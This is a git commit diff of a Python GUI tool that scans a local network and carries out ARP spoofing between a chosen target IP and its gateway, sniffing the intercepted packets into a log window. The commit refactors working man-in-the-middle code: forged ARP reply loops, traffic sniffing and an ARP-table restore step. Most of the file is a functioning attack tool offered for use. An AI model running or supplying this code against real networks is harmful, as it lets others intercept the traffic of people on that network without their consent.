fe4f87f8bf317f8dc502e30b9e1d820d7548e8f7
minhFrontEnd <tdqm146@gmail.com>
2024-06-07 18:37:15 +0700

    update code

--- ARP_spoofing2.py
+++ ARP_spoofing2.py
@@ -1,36 +1,44 @@
 import os
 import socket
 import psutil
-from scapy.all import ARP, Ether, srp, send, sniff, conf
+from scapy.all import ARP, Ether, srp, send, conf, sniff
 import tkinter as tk
-from tkinter import ttk
+from tkinter import ttk, scrolledtext
 import threading
 import platform
 import sys
-import nmap
+import traceback
 
 # Adjust Scapy timeout and retry settings for large networks
 conf.verb = 0  # Disable verbose output
 SCAN_TIMEOUT = 2  # Increase timeout
 SCAN_RETRIES = 3  # Number of retries
 
-class ARP_Spoof_GUI:
+def handle_exceptions(func):
+    def wrapper(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            args[0].log_message(f"Error: {e}\n{traceback.format_exc()}")
+    return wrapper
+
+class NetworkScanGUI:
     def __init__(self, master):
         self.master = master
         master.title("Network Scanning and ARP Spoofing Tool")
         self.create_widgets()
         self.scan_thread = None
-        self.attack_thread = None
+        self.spoof_thread = None
         self.sniff_thread = None
-        self.stop_attack_flag = threading.Event()
+        self.devices = []  # Store scanned devices
+        self.spoofing = False
         self.set_network_interfaces()
 
     def create_widgets(self):
         self.create_scan_frame()
         self.create_devices_frame()
-        self.create_address_frame()
-        self.create_buttons_frame()
-        self.create_packet_text()
+        self.create_spoof_frame()
+        self.create_log_frame()
 
     def create_scan_frame(self):
         self.frame_scan = ttk.Frame(self.master)
@@ -51,53 +59,50 @@ class ARP_Spoof_GUI:
         self.devices_treeview.heading("MAC Address", text="MAC Address")
         self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)
 
-    def create_address_frame(self):
-        self.frame_address = ttk.Frame(self.master)
-        self.frame_address.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
-        self.label_victim_ip = ttk.Label(self.frame_address, text="Victim IP Address:")
-        self.label_victim_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
-        self.entry_victim_ip = ttk.Entry(self.frame_address)
-        self.entry_victim_ip.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
-        self.label_gateway_ip = ttk.Label(self.frame_address, text="Gateway IP Address:")
+    def create_spoof_frame(self):
+        self.frame_spoof = ttk.Frame(self.master)
+        self.frame_spoof.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)
+        self.label_target_ip = ttk.Label(self.frame_spoof, text="Target IP:")
+        self.label_target_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
+        self.target_ip_entry = ttk.Entry(self.frame_spoof)
+        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
+        self.label_gateway_ip = ttk.Label(self.frame_spoof, text="Gateway IP:")
         self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
-        self.entry_gateway_ip = ttk.Entry(self.frame_address)
-        self.entry_gateway_ip.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
+        self.gateway_ip_entry = ttk.Entry(self.frame_spoof)
+        self.gateway_ip_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
+        self.spoof_button = ttk.Button(self.frame_spoof, text="Start ARP Spoofing", command=self.safe_start_arp_spoofing)
+        self.spoof_button.grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
+        self.stop_button = ttk.Button(self.frame_spoof, text="Stop ARP Spoofing", command=self.safe_stop_arp_spoofing)
+        self.stop_button.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
 
-    def create_buttons_frame(self):
-        self.frame_buttons = ttk.Frame(self.master)
-        self.frame_buttons.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)
-        self.attack_button = ttk.Button(self.frame_buttons, text="Start Attack", command=self.start_attack)
-        self.attack_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
-        self.stop_button = ttk.Button(self.frame_buttons, text="Stop Attack", command=self.stop_attack)
-        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
-        self.stop_button.configure(state=tk.DISABLED)
+    def create_log_frame(self):
+        self.frame_log = ttk.Frame(self.master)
+        self.frame_log.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
+        self.log_text = scrolledtext.ScrolledText(self.frame_log, wrap=tk.WORD, width=60, height=10, state='disabled')
+        self.log_text.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)
 
-    def create_packet_text(self):
-        self.packet_text = tk.Text(self.master, height=10, width=70)
-        self.packet_text.grid(row=4, column=0, padx=10, pady=5, sticky=tk.W+tk.E)
-
+    @handle_exceptions
     def set_network_interfaces(self):
         interfaces = self.get_network_interfaces()
         if interfaces:
             self.interfaces['values'] = list(interfaces)
             self.interfaces.set(list(interfaces)[0])
 
+    @handle_exceptions
     def get_network_interfaces(self):
-        try:
-            if platform.system() == 'Windows':
-                interfaces = psutil.net_if_addrs().keys()
-            else:
-                interfaces = psutil.net_if_addrs().keys()
-            return interfaces
-        except Exception as e:
-            print(f"Error getting network interfaces: {e}")
-            return None
+        if platform.system() == 'Windows':
+            interfaces = psutil.net_if_addrs().keys()
+        else:
+            interfaces = psutil.net_if_addrs().keys()
+        return interfaces
 
+    @handle_exceptions
     def scan_network(self):
         selected_network = self.interfaces.get()
         self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
         self.scan_thread.start()
 
+    @handle_exceptions
     def do_scan_network(self, selected_network):
         ip_range = self.get_ip_range(selected_network)
         if not ip_range:
@@ -109,26 +114,15 @@ class ARP_Spoof_GUI:
         # Use Scapy for scanning
         devices = self.scan_with_scapy(ip_range)
         unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
-        devices = list(unique_devices.values())
+        self.devices = list(unique_devices.values())  # Store scanned devices
 
-        for device in devices:
+        # Debug: print the devices list
+        print("Scanned devices with Scapy:", self.devices)
+
+        for device in self.devices:
             self.insert_to_treeview(device['ip'], device['mac'])
 
-        # Use nmap for scanning
-        nm = nmap.PortScanner()
-        try:
-            nm.scan(hosts=ip_range, arguments='-sP')
-            self.parse_nmap_output(nm)
-        except Exception as e:
-            self.insert_to_treeview("Error scanning network with nmap: " + str(e))
-
-    def parse_nmap_output(self, nm):
-        for host in nm.all_hosts():
-            if 'mac' in nm[host]['addresses']:
-                self.insert_to_treeview(nm[host]['addresses']['ipv4'], nm[host]['addresses']['mac'])
-            else:
-                self.insert_to_treeview(nm[host]['addresses']['ipv4'])
-
+    @handle_exceptions
     def get_ip_range(self, interface):
         ip_address = self.get_ip_address(interface)
         netmask = self.get_netmask(interface)
@@ -136,6 +130,7 @@ class ARP_Spoof_GUI:
             return self.ip_to_cidr(ip_address, netmask)
         return None
 
+    @handle_exceptions
     def get_ip_address(self, ifname):
         addrs = psutil.net_if_addrs().get(ifname, [])
         for addr in addrs:
@@ -143,6 +138,7 @@ class ARP_Spoof_GUI:
                 return addr.address
         return None
 
+    @handle_exceptions
     def get_netmask(self, ifname):
         addrs = psutil.net_if_addrs().get(ifname, [])
         for addr in addrs:
@@ -150,168 +146,135 @@ class ARP_Spoof_GUI:
                 return addr.netmask
         return None
 
+    @handle_exceptions
     def ip_to_cidr(self, ip, netmask):
         ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
         netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
         cidr = sum([1 for bit in netmask_bits if bit == '1'])
         return f"{ip}/{cidr}"
 
+    @handle_exceptions
     def scan_with_scapy(self, ip_range):
-        ip_chunks = self.divide_ip_range(ip_range)
         results = []
-        threads = []
-        for chunk in ip_chunks:
-            thread = threading.Thread(target=self.scan_chunk, args=(chunk, results))
-            thread.start()
-            threads.append(thread)
-
-        for thread in threads:
-            thread.join()
-
+        arp = ARP(pdst=ip_range)
+        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = ether / arp
+        result = srp(packet, timeout=SCAN_TIMEOUT, retry=SCAN_RETRIES, verbose=False)[0]
+        for sent, received in result:
+            results.append({'ip': received.psrc, 'mac': received.hwsrc})
         return results
 
-    def scan_chunk(self, ip_chunk, results):
-        try:
-            arp = ARP(pdst=ip_chunk)
-            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-            packet = ether / arp
-            result = srp(packet, timeout=SCAN_TIMEOUT, retry=SCAN_RETRIES, verbose=False)[0]
-            for sent, received in result:
-                results.append({'ip': received.psrc, 'mac': received.hwsrc})
-        except Exception as e:
-            print(f"Error scanning chunk {ip_chunk}: {e}")
-
-    def divide_ip_range(self, ip_range):
-        ip, prefix_length = ip_range.split('/')
-        prefix_length = int(prefix_length)
-        base_ip = '.'.join(ip.split('.')[:3])
-        num_chunks = 256
-        chunk_size = 2**(32 - prefix_length) // num_chunks
-        chunks = []
-        for i in range(num_chunks):
-            start_ip = f"{base_ip}.{i * chunk_size}"
-            end_ip = f"{base_ip}.{(i + 1) * chunk_size - 1}"
-            chunks.append(f"{start_ip}-{end_ip}")
-        return chunks
-
+    @handle_exceptions
     def insert_to_treeview(self, ip, mac=None):
         if mac:
             self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
         else:
             self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))
 
-    def start_attack(self):
-        self.attack_button.configure(state=tk.DISABLED)
-        self.stop_button.configure(state=tk.NORMAL)
-        self.stop_attack_flag.clear()
-        gateway_ip = self.entry_gateway_ip.get()
-        victim_ip = self.entry_victim_ip.get()
-        self.attack_thread = threading.Thread(target=self.do_start_attack, args=(gateway_ip, victim_ip))
-        self.attack_thread.start()
-        self.sniff_thread = threading.Thread(target=self.start_sniffing, args=(victim_ip,))
-        self.sniff_thread.start()
+    def safe_start_arp_spoofing(self):
+        self.safe_method(self.start_arp_spoofing)
 
-    def do_start_attack(self, gateway_ip, victim_ip):
-        self.attacker_mac = self.get_attacker_mac()
-        victim_mac = None
-        gateway_mac = None
-        devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))
+    @handle_exceptions
+    def start_arp_spoofing(self):
+        target_ip = self.target_ip_entry.get()
+        gateway_ip = self.gateway_ip_entry.get()
+        if target_ip and gateway_ip:
+            self.spoofing = True
+            self.spoof_thread_stop_event = threading.Event()
+            self.sniff_thread_stop_event = threading.Event()
+            self.log_message(f"Starting ARP spoofing: Target IP={target_ip}, Gateway IP={gateway_ip}")
+            self.spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip))
+            self.spoof_thread.start()
+            self.sniff_thread = threading.Thread(target=self.sniff_packets, args=(target_ip, gateway_ip))
+            self.sniff_thread.start()
+        else:
+            self.log_message("Please provide both Target IP and Gateway IP.")
 
-        for device in devices:
-            if device['ip'] == victim_ip:
-                victim_mac = device['mac']
-            if device['ip'] == gateway_ip:
-                gateway_mac = device['mac']
+    def safe_stop_arp_spoofing(self):
+        self.safe_method(self.stop_arp_spoofing)
 
-        if not victim_mac or not gateway_mac:
-            self.insert_to_treeview("Could not find MAC addresses for the given IPs.")
+    @handle_exceptions
+    def stop_arp_spoofing(self):
+        if self.spoofing:
+            self.spoof_thread_stop_event.set()
+            self.sniff_thread_stop_event.set()
+            if self.spoof_thread.is_alive():
+                self.spoof_thread.join()
+            if self.sniff_thread.is_alive():
+                self.sniff_thread.join()
+            self.spoofing = False
+            self.log_message("Stopped ARP spoofing.")
+            target_ip = self.target_ip_entry.get()
+            gateway_ip = self.gateway_ip_entry.get()
+            target_mac = self.get_mac(target_ip)
+            gateway_mac = self.get_mac(gateway_ip)
+            self.restore_network(target_ip, gateway_ip, target_mac, gateway_mac)
+
+    @handle_exceptions
+    def arp_spoof(self, target_ip, gateway_ip):
+        target_mac = self.get_mac(target_ip)
+        gateway_mac = self.get_mac(gateway_ip)
+        if not target_mac or not gateway_mac:
+            self.log_message("Could not find MAC addresses for the provided IPs.")
             return
 
-        self.insert_to_treeview(f"Starting ARP spoofing: {victim_ip} ({victim_mac}) -> {gateway_ip} ({gateway_mac})")
         try:
-            while not self.stop_attack_flag.is_set():
-                self.arp_spoof(victim_ip, victim_mac, gateway_ip)
-                self.arp_spoof(gateway_ip, gateway_mac, victim_ip)
-        except KeyboardInterrupt:
-            self.insert_to_treeview("\nStopping ARP spoofing. Restoring network...")
-            self.restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
-            self.restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
-            self.attack_button.configure(state=tk.NORMAL)
-            self.stop_button.configure(state=tk.DISABLED)
+            while not self.spoof_thread_stop_event.is_set():
+                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
+                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
+                self.spoof_thread_stop_event.wait(2)
+        except Exception as e:
+            self.log_message(f"Error in ARP spoofing: {e}")
 
-    def arp_spoof(self, target_ip, target_mac, spoof_ip):
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=self.attacker_mac)
-        send(packet, verbose=False)
+    @handle_exceptions
+    def sniff_packets(self, target_ip, gateway_ip):
+        filter_str = f"host {target_ip} or host {gateway_ip}"
+        try:
+            while not self.sniff_thread_stop_event.is_set():
+                packets = sniff(filter=filter_str, timeout=10)
+                for packet in packets:
+                    self.log_packet(packet)
+        except Exception as e:
+            self.log_message(f"Error in sniffing packets: {e}")
 
-    def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
-        send(packet, verbose=False)
+    @handle_exceptions
+    def log_packet(self, packet):
+        self.log_message(f"Packet: {packet.summary()}")
 
-    def start_sniffing(self, victim_ip):
-        self.victim_mac = None
-        devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))
-        for device in devices:
-            if device['ip'] == victim_ip:
-                self.victim_mac = device['mac']
-                break
-
-        if not self.victim_mac:
-            self.insert_to_treeview("Could not find MAC address of the victim.")
-            return
-
-        self.gateway_mac = None
-        gateway_ip = self.entry_gateway_ip.get()
-        for device in devices:
-            if device['ip'] == gateway_ip:
-                self.gateway_mac = device['mac']
-                break
-
-        if not self.gateway_mac:
-            self.insert_to_treeview("Could not find MAC address of the gateway.")
-            return
-
-        sniff(filter=f"host {victim_ip}", prn=self.handle_packet)
-
-    def handle_packet(self, packet):
-        if packet.haslayer(IP):
-            if packet.src == self.victim_mac and packet.dst == self.attacker_mac:
-                modified_packet = self.modify_packet(packet)
-                send(modified_packet, verbose=False)
-                self.insert_to_packet_text(f"Forwarded to Gateway: {packet.summary()}\n")
-            elif packet.src == self.gateway_mac and packet.dst == self.attacker_mac:
-                modified_packet = self.modify_packet(packet)
-                send(modified_packet, verbose=False)
-                self.insert_to_packet_text(f"Forwarded to Victim: {packet.summary()}\n")
-
-    def modify_packet(self, packet):
-        return packet
-
-    def insert_to_packet_text(self, text):
-        self.packet_text.insert(tk.END, text)
-        self.packet_text.see(tk.END)
-
-    def get_attacker_mac(self):
-        addrs = psutil.net_if_addrs().get(self.interfaces.get(), [])
-        for addr in addrs:
-            if addr.family == psutil.AF_LINK:
-                return addr.address
+    @handle_exceptions
+    def get_mac(self, ip):
+        arp_request = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+        if answered_list:
+            return answered_list[0][1].hwsrc
+        else:
+            self.log_message(f"No response for IP {ip}")
         return None
 
-    def stop_attack(self):
-        self.attack_button.configure(state=tk.NORMAL)
-        self.stop_button.configure(state=tk.DISABLED)
-        self.stop_attack_flag.set()
+    @handle_exceptions
+    def restore_network(self, target_ip, gateway_ip, target_mac, gateway_mac):
+        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3, verbose=False)
+        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3, verbose=False)
+        self.log_message(f"Restored network: Target IP={target_ip}, Gateway IP={gateway_ip}")
 
-        if self.attack_thread and self.attack_thread.is_alive():
-            self.attack_thread.join()
+    def log_message(self, message):
+        self.log_text.configure(state='normal')
+        self.log_text.insert(tk.END, message + '\n')
+        self.log_text.configure(state='disabled')
+        self.log_text.yview(tk.END)
 
-        if self.sniff_thread and self.sniff_thread.is_alive():
-            self.sniff_thread.join()
+    def safe_method(self, method):
+        try:
+            method()
+        except Exception as e:
+            self.log_message(f"Error: {e}\n{traceback.format_exc()}")
 
 def main():
     try:
         root = tk.Tk()
-        gui = ARP_Spoof_GUI(root)
+        gui = NetworkScanGUI(root)
         root.protocol("WM_DELETE_WINDOW", lambda: on_close(root))
         root.mainloop()
     except Exception as e:
